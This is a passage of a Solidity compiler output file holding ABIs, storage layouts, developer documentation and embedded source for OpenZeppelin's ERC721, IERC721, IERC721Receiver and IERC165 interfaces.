value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xa1e8e83cd0087785df04ac79fb395d9f3684caeaf973d9e2c71caef723a3a5d6\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":79,"contract":"@openzeppelin/contracts/token/ERC721/ERC721.sol:ERC721","label":"_name","offset":0,"slot":"0","type":"t_string_storage"},{"astId":81,"contract":"@openzeppelin/contracts/token/ERC721/ERC721.sol:ERC721","label":"_symbol","offset":0,"slot":"1","type":"t_string_storage"},{"astId":85,"contract":"@openzeppelin/contracts/token/ERC721/ERC721.sol:ERC721","label":"_owners","offset":0,"slot":"2","type":"t_mapping(t_uint256,t_address)"},{"astId":89,"contract":"@openzeppelin/contracts/token/ERC721/ERC721.sol:ERC721","label":"_balances","offset":0,"slot":"3","type":"t_mapping(t_address,t_uint256)"},{"astId":93,"contract":"@openzeppelin/contracts/token/ERC721/ERC721.sol:ERC721","label":"_tokenApprovals","offset":0,"slot":"4","type":"t_mapping(t_uint256,t_address)"},{"astId":99,"contract":"@openzeppelin/contracts/token/ERC721/ERC721.sol:ERC721","label":"_operatorApprovals","offset":0,"slot":"5","type":"t_mapping(t_address,t_mapping(t_address,t_bool))"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_bool":{"encoding":"inplace","label":"bool","numberOfBytes":"1"},"t_mapping(t_address,t_bool)":{"encoding":"mapping","key":"t_address","label":"mapping(address => bool)","numberOfBytes":"32","value":"t_bool"},"t_mapping(t_address,t_mapping(t_address,t_bool))":{"encoding":"mapping","key":"t_address","label":"mapping(address => mapping(address => bool))","numberOfBytes":"32","value":"t_mapping(t_address,t_bool)"},"t_mapping(t_address,t_uint256)":{"encoding":"mapping","key":"t_address","label":"mapping(address => uint256)","numberOfBytes":"32","value":"t_uint256"},"t_mapping(t_uint256,t_address)":{"encoding":"mapping","key":"t_uint256","label":"mapping(uint256 => address)","numberOfBytes":"32","value":"t_address"},"t_string_storage":{"encoding":"bytes","label":"string","numberOfBytes":"32"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/token/ERC721/IERC721.sol":{"IERC721":{"abi":[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"operator","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"owner","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"_approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Required interface of an ERC721 compliant contract.","events":{"Approval(address,address,uint256)":{"details":"Emitted when `owner` enables `approved` to manage the `tokenId` token."},"ApprovalForAll(address,address,bool)":{"details":"Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets."},"Transfer(address,address,uint256)":{"details":"Emitted when `tokenId` token is transferred from `from` to `to`."}},"kind":"dev","methods":{"approve(address,uint256)":{"details":"Gives permission to `to` to transfer `tokenId` token to another account. The approval is cleared when the token is transferred. Only a single account can be approved at a time, so approving the zero address clears previous approvals. Requirements: - The caller must own the token or be an approved operator. - `tokenId` must exist. Emits an {Approval} event."},"balanceOf(address)":{"details":"Returns the number of tokens in ``owner``'s account."},"getApproved(uint256)":{"details":"Returns the account approved for `tokenId` token. Requirements: - `tokenId` must exist."},"isApprovedForAll(address,address)":{"details":"Returns if the `operator` is allowed to manage all of the assets of `owner`. See {setApprovalForAll}"},"ownerOf(uint256)":{"details":"Returns the owner of the `tokenId` token. Requirements: - `tokenId` must exist."},"safeTransferFrom(address,address,uint256)":{"details":"Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients are aware of the ERC721 protocol to prevent tokens from being forever locked. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event."},"safeTransferFrom(address,address,uint256,bytes)":{"details":"Safely transfers `tokenId` token from `from` to `to`. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event."},"setApprovalForAll(address,bool)":{"details":"Approve or remove `operator` as an operator for the caller. Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller. Requirements: - The `operator` cannot be the caller. Emits an {ApprovalForAll} event."},"supportsInterface(bytes4)":{"details":"Returns true if this contract implements the interface defined by `interfaceId`. See the corresponding https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] to learn more about how these ids are created. This function call must use less than 30 000 gas."},"transferFrom(address,address,uint256)":{"details":"Transfers `tokenId` token from `from` to `to`. WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721 or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must understand this adds an external call which potentially creates a reentrancy vulnerability. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. Emits a {Transfer} event."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","getApproved(uint256)":"081812fc","isApprovedForAll(address,address)":"e985e9c5","ownerOf(uint256)":"6352211e","safeTransferFrom(address,address,uint256)":"42842e0e","safeTransferFrom(address,address,uint256,bytes)":"b88d4fde","setApprovalForAll(address,bool)":"a22cb465","supportsInterface(bytes4)":"01ffc9a7","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Required interface of an ERC721 compliant contract.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when `owner` enables `approved` to manage the `tokenId` token.\"},\"ApprovalForAll(address,address,bool)\":{\"details\":\"Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `tokenId` token is transferred from `from` to `to`.\"}},\"kind\":\"dev\",\"methods\":{\"approve(address,uint256)\":{\"details\":\"Gives permission to `to` to transfer `tokenId` token to another account. The approval is cleared when the token is transferred. Only a single account can be approved at a time, so approving the zero address clears previous approvals. Requirements: - The caller must own the token or be an approved operator. - `tokenId` must exist. Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the number of tokens in ``owner``'s account.\"},\"getApproved(uint256)\":{\"details\":\"Returns the account approved for `tokenId` token. Requirements: - `tokenId` must exist.\"},\"isApprovedForAll(address,address)\":{\"details\":\"Returns if the `operator` is allowed to manage all of the assets of `owner`. See {setApprovalForAll}\"},\"ownerOf(uint256)\":{\"details\":\"Returns the owner of the `tokenId` token. Requirements: - `tokenId` must exist.\"},\"safeTransferFrom(address,address,uint256)\":{\"details\":\"Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients are aware of the ERC721 protocol to prevent tokens from being forever locked. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event.\"},\"safeTransferFrom(address,address,uint256,bytes)\":{\"details\":\"Safely transfers `tokenId` token from `from` to `to`. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event.\"},\"setApprovalForAll(address,bool)\":{\"details\":\"Approve or remove `operator` as an operator for the caller. Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller. Requirements: - The `operator` cannot be the caller. Emits an {ApprovalForAll} event.\"},\"supportsInterface(bytes4)\":{\"details\":\"Returns true if this contract implements the interface defined by `interfaceId`. See the corresponding https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] to learn more about how these ids are created. This function call must use less than 30 000 gas.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Transfers `tokenId` token from `from` to `to`. WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721 or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must understand this adds an external call which potentially creates a reentrancy vulnerability. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC721/IERC721.sol\":\"IERC721\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC721/IERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/IERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../../utils/introspection/IERC165.sol\\\";\\n\\n/**\\n * @dev Required interface of an ERC721 compliant contract.\\n */\\ninterface IERC721 is IERC165 {\\n    /**\\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\\n     */\\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\\n     */\\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\\n\\n    /**\\n     * @dev Returns the number of tokens in ``owner``'s account.\\n     */\\n    function balanceOf(address owner) external view returns (uint256 balance);\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external;\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Transfers `tokenId` token from `from` to `to`.\\n     *\\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\\n     * The approval is cleared when the token is transferred.\\n     *\\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\\n     *\\n     * Requirements:\\n     *\\n     * - The caller must own the token or be an approved operator.\\n     * - `tokenId` must exist.\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\\n     *\\n     * Requirements:\\n     *\\n     * - The `operator` cannot be the caller.\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function setApprovalForAll(address operator, bool _approved) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function getApproved(uint256 tokenId) external view returns (address operator);\\n\\n    /**\\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\\n     *\\n     * See {setApprovalForAll}\\n     */\\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\\n}\\n\",\"keccak256\":\"0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol":{"IERC721Receiver":{"abi":[{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"address","name":"from","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Interface for any contract that wants to support safeTransfers from ERC721 asset contracts.","kind":"dev","methods":{"onERC721Received(address,address,uint256,bytes)":{"details":"Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom} by `operator` from `from`, this function is called. It must return its Solidity selector to confirm the token transfer. If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted. The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`."}},"title":"ERC721 token receiver interface","version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"onERC721Received(address,address,uint256,bytes)":"150b7a02"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"onERC721Received\",\"outputs\":[{\"internalType\":\"bytes4\",\"name\":\"\",\"type\":\"bytes4\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface for any contract that wants to support safeTransfers from ERC721 asset contracts.\",\"kind\":\"dev\",\"methods\":{\"onERC721Received(address,address,uint256,bytes)\":{\"details\":\"Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom} by `operator` from `from`, this function is called. It must return its Solidity selector to confirm the token transfer. If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted. The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\"}},\"title\":\"ERC721 token receiver interface\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\":\"IERC721Receiver\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @title ERC721 token receiver interface\\n * @dev Interface for any contract that wants to support safeTransfers\\n * from ERC721 asset contracts.\\n */\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\",\"keccak256\":\"0xa82b58eca1ee256be466e536706850163d2ec7821945abd6b4778cfb3bee37da\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol":{"IERC721Metadata":{"abi":[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"operator","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"owner","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"_approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"See https://eips.ethereum.org/EIPS/eip-721","kind":"dev","methods":{"approve(address,uint256)":{"details":"Gives permission to `to` to transfer `tokenId` token to another account. The approval is cleared when the token is transferred. Only a single account can be approved at a time, so approving the zero address clears previous approvals. Requirements: - The caller must own the token or be an approved operator. - `tokenId` must exist. Emits an {Approval} event."},"balanceOf(address)":{"details":"Returns the number of tokens in ``owner``'s account."},"getApproved(uint256)":{"details":"Returns the account approved for `tokenId` token. Requirements: - `tokenId` must exist."},"isApprovedForAll(address,address)":{"details":"Returns if the `operator` is allowed to manage all of the assets of `owner`. See 